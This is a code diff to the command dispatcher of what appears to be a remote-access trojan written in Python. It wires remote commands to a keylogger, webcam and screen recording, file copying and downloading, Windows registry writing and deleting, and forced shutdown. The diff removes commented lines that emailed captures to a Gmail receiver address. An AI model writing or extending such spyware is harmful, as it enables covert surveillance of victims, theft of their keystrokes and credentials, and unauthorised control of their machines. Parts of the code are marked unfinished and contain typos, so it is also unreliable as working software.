@@ -6,87 +6,133 @@ from utils.screen import Screen
 from utils.webcam import Webcam
 from utils.keylogger import KeyLogger
 from utils.fileSystem import FileSystem
+from utils.registry import Registry
 from utils.receiver import Receiver
 
 
+# Process
 def list_process():
     doit = Process()
     processes = doit.run(code='view')
     return processes
 
 
-def kill_process():
+def kill_process(id=0):
     doit = Process()
-    succeed_status = doit.run(code='kill')
+    succeed_status = doit.run(code='kill', id=id)
     return succeed_status
 
 
+# Application
 def list_application():
     doit = Application()
     apps = doit.run(code='view')
     return apps
 
 
-def kill_application():
+def kill_application(id=0):
     doit = Application()
-    succeed_status = doit.run(code='kill')
+    succeed_status = doit.run(code='kill', id=id)
     return succeed_status
 
 
+# Screen
 def capture_screen():
     doit = Screen()
     succeed_status = doit.run(code='image')
     return succeed_status
-    # load image/video
-    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)
 
 
 def record_screen(seconds=10):
     doit = Screen()
     succeed_status = doit.run(code='video', time=seconds)
     return succeed_status
-    # load image/video
-    # self.s.send_mail("rece
 
 
+# Webcam
 def shot_webcam():
     doit = Webcam()
     succeed_status = doit.run(code='image')
     return succeed_status
-    # load image/video
-    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)
 
 
 def record_webcam(seconds=10):
     doit = Webcam()
     succeed_status = doit.run(code='video', time=seconds)
     return succeed_status
-    # load image/video
-    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)
 
 
+# Keylogger
 def get_keylogger(seconds=10):
     doit = KeyLogger()
     log = doit.hook_in(Xtime=seconds)
     return log
-    # self.s.send_mail("receiverimap002@gmail.com", 'screen', log)
 
 
+# File System
 def list_fileSystem():
     doit = FileSystem()
     tree = doit.getTree()
     return tree
-    # sent tree
 
 
+def copy_fileSystem(parameters):
+    doit = FileSystem()
+    succeed_status = doit.run('copy', parameters)
+    return succeed_status
+
+
+def download_fileSystem(parameters):                                                        #not done
+    doit = FileSystem()
+    succeed_status = doit.run('download', parameters)
+    return succeed_status
+
+
+# Registry
+def write_registry(parameters):
+    doit = Registry()
+    succeed_status = doit.run('write', parameters)
+    return succeed_status
+
+
+def get_registry(parameters):
+    doit = Registry()
+    value = doit.run('get', parameters)
+    return value
+
+
+def set_registry(parameters):
+    doit = Registry()
+    succeed_status = doit.run('set', parameters)
+    return succeed_status
+
+
+def create_registry(parameters):
+    doit = Registry()
+    succeed_status = doit.run('create', parameters)
+    return succeed_status
+
+
+def del_value_registry(parameters):
+    doit = Registry()
+    succeed_status = doit.run('delete-value', parameters)
+    return succeed_status
+
+
+def del_key_registry(parameters):
+    doit = Registry()
+    succeed_status = doit.run('delete-key', parameters)
+    return succeed_status
+
+
+# Shutdown
 def shutdown(seconds=10):
-    # send message 'shutdown, complete!'
     os.popen("shutdown -s -t {}".format(seconds))
     return True
 
 
+# Restart
 def restart(self):
-    # send message 'restart, complete!'
     os.popen("shutdown /r")
     return True
 
@@ -127,20 +173,50 @@ def execute(command, parameter=None):  # parameter
             int(parameter)) if parameter else record_webcam()
         return content
 
-    elif command == 'FILE SYSTEM':
+    elif command == 'VIEW FILE SYSTEM':
         content = list_fileSystem()
+        print(content)
         return content
 
-    elif command == 'REGISTRY':  # NOT DONE
-        return True
+    elif command == 'COPY FILE SYSTEM':
+        content = copy_fileSystem(parameter)
+        return content
+
+    elif command == 'DOWNLOAD FILE SYSTEM':                                                      # not done
+        content = download_fileSystem(parameter)
+        return content
+
+    elif command == 'WRITE REGISTRY':  
+        content = write_registry(parameter)
+        print(content)
+        return content
+
+    elif command == 'SET REGISTRY':  
+        content = set_registry(parameter)
+        return content
+
+    elif command == 'CREATE REGISTRY':  
+        content = create_registry(parameter)
+        return content
+
+    elif command == 'GET REGISTRY':  
+        content = get_registry(parameter)
+        return content
+
+    elif command == 'DELETA VALUE REGISTRY':  
+        content = del_value_registry(parameter)
+        return content
+
+    elif command == 'DELETE KEY REGISTRY':  
+        content = del_key_registry(parameter)
+        return content
 
     elif command == 'KEYLOGGER':
-        content = get_keylogger(
-            int(parameter)) if parameter else get_keylogger()
+        content = get_keylogger(parameter)
         return content
 
     elif command == 'SHUTDOWN':
-        content = shutdown(int(parameter)) if parameter else shutdown()
+        content = shutdown(parameter)
         return content
 
     elif command == 'RESTART':
